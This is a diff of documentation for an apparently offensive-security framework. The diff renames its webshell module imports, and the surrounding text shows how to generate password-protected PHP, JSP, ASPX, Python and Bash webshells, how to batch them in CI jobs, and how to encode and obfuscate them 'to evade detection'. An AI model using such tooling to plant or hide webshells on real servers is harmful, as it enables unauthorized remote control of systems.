@@ -33,7 +33,7 @@ webshell/
 Generate PHP webshells with various features:
 
 ```python
-from ofx.api.webshell import PhpShell
+from ofx.api.exploitation.webshell import PhpShell
 
 shell = PhpShell(
     password="mypass",
@@ -62,7 +62,7 @@ code = shell.generate()
 Java Server Pages webshells:
 
 ```python
-from ofx.api.webshell import JspShell
+from ofx.api.exploitation.webshell import JspShell
 
 shell = JspShell(password="admin")
 code = shell.generate()
@@ -73,7 +73,7 @@ code = shell.generate()
 ASP.NET webshells for IIS servers:
 
 ```python
-from ofx.api.webshell import AspxShell
+from ofx.api.exploitation.webshell import AspxShell
 
 shell = AspxShell(
     password="pass123",
@@ -87,7 +87,7 @@ code = shell.generate()
 Flask/Django-based webshells:
 
 ```python
-from ofx.api.webshell import PythonShell
+from ofx.api.exploitation.webshell import PythonShell
 
 shell = PythonShell(
     framework="flask",  # or "django"
@@ -101,7 +101,7 @@ code = shell.generate()
 CGI-based bash webshells:
 
 ```python
-from ofx.api.webshell import BashShell
+from ofx.api.exploitation.webshell import BashShell
 
 shell = BashShell(password="shell")
 code = shell.generate()
@@ -112,7 +112,7 @@ code = shell.generate()
 The factory pattern provides a unified interface for creating webshells:
 
 ```python
-from ofx.api.webshell import WebShellFactory
+from ofx.api.exploitation.webshell import WebShellFactory
 
 # Create PHP shell
 factory = WebShellFactory()
@@ -135,7 +135,7 @@ aspx_shell = factory.create(
 ### Using Built-in Templates
 
 ```python
-from ofx.api.webshell import PhpShell
+from ofx.api.exploitation.webshell import PhpShell
 
 shell = PhpShell(password="pass")
 
@@ -153,7 +153,7 @@ code = shell.generate()
 Templates use Jinja2 syntax with special placeholders:
 
 ```python
-from ofx.api.webshell import PhpShell
+from ofx.api.exploitation.webshell import PhpShell
 
 # Define custom template
 custom_template = '''<?php
@@ -250,7 +250,7 @@ jobs:
     steps:
       - name: Generate PHP shell
         script: |
-          from ofx.api.webshell import PhpShell
+          from ofx.api.exploitation.webshell import PhpShell
           
           shell = PhpShell(
               password="cmd",
@@ -276,7 +276,7 @@ jobs:
     steps:
       - name: Generate all types
         script: |
-          from ofx.api.webshell import WebShellFactory
+          from ofx.api.exploitation.webshell import WebShellFactory
           
           factory = WebShellFactory()
           languages = ['php', 'jsp', 'aspx', 'python']
@@ -300,7 +300,7 @@ jobs:
     steps:
       - name: Generate with inputs
         script: |
-          from ofx.api.webshell import PhpShell
+          from ofx.api.exploitation.webshell import PhpShell
           
           shell = PhpShell(
               password="${{ inputs.password }}",
@@ -319,7 +319,7 @@ jobs:
 Apply encoding to evade detection:
 
 ```python
-from ofx.api.webshell import PhpShell
+from ofx.api.exploitation.webshell import PhpShell
 
 shell = PhpShell(password="cmd", encoder="base64")
 code = shell.generate()
@@ -342,7 +342,7 @@ code = shell.generate()
 Obfuscate strings in the shell:
 
 ```python
-from ofx.api.webshell.obfuscator import obfuscate_strings
+from ofx.api.exploitation.webshell.obfuscator import obfuscate_strings
 
 code = shell.generate()
 obfuscated = obfuscate_strings(code, method="hex")
@@ -442,7 +442,7 @@ Best practices:
 ### Local Testing
 
 ```python
-from ofx.api.webshell import PhpShell
+from ofx.api.exploitation.webshell import PhpShell
 import subprocess
 
 # Generate shell
